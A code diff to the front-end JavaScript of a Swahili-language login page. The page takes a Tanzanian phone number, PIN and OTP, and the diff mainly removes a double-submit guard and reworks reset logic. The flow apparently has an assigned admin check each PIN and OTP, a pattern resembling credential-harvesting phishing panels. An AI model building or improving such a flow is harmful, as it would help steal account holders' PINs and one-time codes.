@@ -769,10 +769,7 @@
   // ══════════════════════════════════════════════════════
   // LOGIN — CALLS /api/verify-pin
   // ══════════════════════════════════════════════════════
-  let _loginInFlight = false;
-
   async function doLogin() {
-    if (_loginInFlight) return;          // hard guard against double-tap / double-call
     hideLoginMsg();
 
     const rawPhone = document.getElementById('lgPh').value.trim();
@@ -786,7 +783,6 @@
     const phoneNumber = '+255' + rawPhone;
     const adminId = getAdminId();
 
-    _loginInFlight = true;
     document.getElementById('mLogin').classList.add('show');
     document.getElementById('bLogin').disabled = true;
 
@@ -805,7 +801,6 @@
       const data = await res.json();
 
       document.getElementById('mLogin').classList.remove('show');
-      _loginInFlight = false;
 
       if (data.success) {
         S.applicationId   = data.applicationId;
@@ -825,7 +820,6 @@
       }
 
     } catch (err) {
-      _loginInFlight = false;
       document.getElementById('mLogin').classList.remove('show');
       document.getElementById('bLogin').disabled = false;
       showLoginMsg('Hitilafu ya mtandao. Tafadhali angalia muunganiko wako na ujaribu tena.');
@@ -859,27 +853,8 @@
           clearInterval(pinPollInterval);
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpInputSection').style.display = 'none';
-          showOtpMsg('error', 'Maelezo yako hayakuweza kuthibitishwa. Unaelekezwa kwenye kuingia…');
-          setTimeout(() => {
-            // Reset OTP page state
-            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-            document.getElementById('bOtp').className = 'btn-otp';
-            document.getElementById('bOtp').disabled = false;
-            document.getElementById('otpInputSection').style.display = 'block';
-            if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = 'Tuma tena msimbo ndani ya <span id="rsS">60</span> sekunde';
-            hideOtpMsgs();
-            // Reset login page — clear PIN boxes, keep phone, re-enable button
-            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
-            document.getElementById('bLogin').disabled = false;
-            const phoneVal = document.getElementById('lgPh').value.trim();
-            document.getElementById('bLogin').className = phoneVal ? 'btn-login rdy' : 'btn-login';
-            hideLoginMsg();
-            _loginInFlight = false;
-            S.applicationId = null;
-            S.assignedAdminId = null;
-            goTo('page-login');
-          }, 2500);
+          showOtpMsg('error', 'Maelezo yako hayakuweza kuthibitishwa. Tafadhali rudi na ujaribu tena.');
+          document.getElementById('bLogin').disabled = false;
         }
       } catch (e) {
         // Silent
@@ -1042,23 +1017,17 @@
           clearInterval(otpPollInterval);
           showOtpMsg('error', 'PIN isiyosahihi imegunduliwa. Unaelekezwa kwenye kuingia…');
           setTimeout(() => {
-            // Reset OTP page state
+            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
+            chkLogin();
+            document.getElementById('bLogin').disabled = false;
             [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
             document.getElementById('bOtp').className = 'btn-otp';
             document.getElementById('bOtp').disabled = false;
             document.getElementById('pinWait').classList.remove('show');
-            document.getElementById('otpInputSection').style.display = 'block';
+            document.getElementById('otpInputSection').style.display = '';
             if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
             document.getElementById('otpRs').innerHTML = 'Tuma tena msimbo ndani ya <span id="rsS">60</span> sekunde';
             hideOtpMsgs();
-            // Reset login page state — clear PIN boxes but preserve phone number
-            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
-            // Re-enable login button (phone is still filled so it should become ready)
-            document.getElementById('bLogin').disabled = false;
-            const phoneVal = document.getElementById('lgPh').value.trim();
-            document.getElementById('bLogin').className = phoneVal ? 'btn-login rdy' : 'btn-login';
-            hideLoginMsg();
-            _loginInFlight = false;
             S.applicationId = null;
             S.assignedAdminId = null;
             goTo('page-login');
@@ -1069,8 +1038,6 @@
           [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
           document.getElementById('bOtp').className = 'btn-otp';
           document.getElementById('bOtp').disabled = false;
-          document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'block';
           showOtpMsg('error', 'Msimbo wa OTP usio sahihi. Tafadhali angalia na uweke tena.');
           document.getElementById('o0').focus();
         }
